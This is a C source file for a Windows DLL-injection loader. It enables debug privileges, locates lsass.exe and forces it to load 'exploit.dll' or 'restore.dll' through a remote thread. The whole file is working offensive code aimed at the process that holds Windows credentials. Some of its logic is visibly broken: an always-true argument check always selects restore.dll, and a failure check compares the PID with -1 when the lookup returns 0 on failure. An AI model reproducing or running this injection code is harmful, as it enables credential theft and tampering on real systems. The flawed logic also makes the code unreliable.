// cl.exe /nologo /MT /Ox /W0 /GS- /DNDEBUG loader.c /link Advapi32.lib /OUT:loader.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

#include <windows.h>
#include <TlHelp32.h>

int GetLsassPid() {
  HANDLE hSnapshot;
  PROCESSENTRY32 pe;
  int pid = 0;
  BOOL hResult;
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
  pe.dwSize = sizeof(PROCESSENTRY32);
  hResult = Process32First(hSnapshot, &pe);
  while (hResult) {
    if (strcmp("lsass.exe", pe.szExeFile) == 0) {
      pid = pe.th32ProcessID;
      printf("pid: %i\n", pid);
      break;
    }
    hResult = Process32Next(hSnapshot, &pe);
  }
  CloseHandle(hSnapshot);
  return pid;
}

BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tokenPrivileges;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("Error: OpenProcessToken failed (%lu)\n", GetLastError());
        return FALSE;
    }
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tokenPrivileges.Privileges[0].Luid)) {
        printf("Error: LookupPrivilegeValue failed (%lu)\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        printf("Error: AdjustTokenPrivileges failed (%lu)\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);
    return TRUE;
}

VOID main(int argc, char* argv[]) {
    DWORD PathResult, LsassPid;
    HANDLE ProcessHandle = NULL, ThreadHandle = NULL;
    LPVOID Allocation = NULL;
    CHAR FullPath[MAX_PATH];
    UINT64 FuncAddr;
    ULONG PreviousValue;
    int op = 0;

    if(argc >= 2) {
        op = atoi(argv[1]);
        if(op != 0 || op != 6)
            op = 6;
    }

    if (EnableDebugPrivilege()) {
        printf("Debug privileges enabled successfully.\n");
    } else {
        printf("Failed to enable debug privileges.\n");
        return;
    }

    LsassPid = GetLsassPid();
    if (LsassPid == -1) {
        goto end;
    }

    char* dll = (op == 0) ? "exploit.dll" : "restore.dll";
    PathResult = GetFullPathNameA(dll, sizeof(FullPath), FullPath, NULL);
    if (!PathResult || (PathResult > sizeof(FullPath))) {
        goto end;
    }

    ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, LsassPid);
    if (!ProcessHandle) {
        goto end;
    }
    
    Allocation = VirtualAllocEx(ProcessHandle, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!Allocation) {
        goto end;
    }

    if (!WriteProcessMemory(ProcessHandle, Allocation, FullPath, sizeof(FullPath), NULL)) {
        goto end;
    }

    ThreadHandle = CreateRemoteThread(ProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, Allocation, 0, NULL);

end:
    if (ThreadHandle) {
        CloseHandle(ThreadHandle);
    }

    if (ProcessHandle) {
        if (!ThreadHandle && Allocation) {
            VirtualFreeEx(ProcessHandle, Allocation, 0, MEM_RELEASE);
        }
        CloseHandle(ProcessHandle);
    }
}
